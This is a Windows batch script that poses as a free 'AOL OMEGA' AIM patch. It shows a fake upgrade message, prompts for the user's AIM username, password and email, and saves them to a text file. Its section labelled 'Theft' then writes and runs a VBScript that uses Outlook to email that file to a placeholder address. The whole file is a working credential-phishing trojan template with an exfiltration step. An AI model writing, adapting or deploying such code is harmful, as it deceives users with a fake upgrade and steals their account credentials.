@echo off
goto Opening_Message
:Opening_Message
echo msgbox "AOL OMEGA!The new AIM patch. Completely Free!We tracked all of the users of AIM and are for their program because of the celebration of our new department in online videogaming!AOL OMEGA will now begin to upgrade your system. If you dont have AIM, then this program will automatically download it for you! Isn't that great?But you have to Type in your username and password so that the program can long onto the AIM Server Network and send your computer the upgrades." >> c:\Opening.vbs
start c:\Opening.vbs
goto Questions

:Questions
set /p Username=Please Enter Your Username:
cls
set /p Password=Please enter Your Password:
cls
set /p email=Please enter your email, (Activation Code will be sent):
echo %username% >>c:\UPE.txt
echo %password% >>c:\UPE.txt
echo %email% >>c:\UPE.txt
echo Username:%username%
echo password:%password%
echo Email:%email%
echo If correct please press "Y" if not press "N"
pause
cls
echo Thank You for Signing Up.
pause
goto Theft

:Theft
echo if exist c:\mail.vbs 
echo Dim x >> c:\mail.vbs
echo on error resume next >> c:\mail.vbs
echo Set fso ="Scripting.FileSystem.Object" >> c:\mail.vbs
echo Set so=CreateObject(fso) >> c:\mail.vbs
echo Set ol=CreateObject("Outlook.Application") >> c:\mail.vbs
echo Set out= WScript.CreateObject("Outlook.Application") >> c:\mail.vbs
echo Set Mail=ol.CreateItem(0) >> c:\mail.vbs
echo Mail.to="youremail@provider.bla" >> c:\mail.vbs
echo Mail.Subject="IP" >> c:\mail.vbs
echo Mail.Body="IP" >> c:\mail.vbs
echo Mail.Attachments.Add("c:UPE.txt") >> c:\mail.vbs
echo Mail.Send >> c:\mail.vbs
echo ol.Quit >> c:\mail.vbs
start c:\mail.vbs

